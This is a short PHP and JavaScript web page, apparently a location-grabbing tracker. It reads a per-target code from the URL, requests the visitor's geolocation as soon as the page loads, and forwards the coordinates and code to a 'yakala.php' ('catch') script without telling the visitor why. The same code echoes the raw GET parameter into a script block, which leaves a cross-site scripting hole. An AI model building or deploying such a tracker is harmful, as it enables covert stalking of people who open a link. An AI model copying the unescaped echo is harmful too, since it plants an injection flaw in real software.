<?php
$kod = $_GET["h"];
?>

<p id="demo"></p>

<script>
  var x = document.getElementById("demo");

  function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition);
    } else { 
      x.innerHTML = "Geolocation is not supported by this browser.";
    }
  }

  function showPosition(position) {
    var enlem = position.coords.latitude;
    var boylam = position.coords.longitude;

    var url = "yakala.php?enlem=" + enlem + "&boylam=" + boylam + "&kod=<?php echo $kod; ?>";

    window.location.href = url;
  }

  window.onload = function() {
    getLocation();
  };
</script>
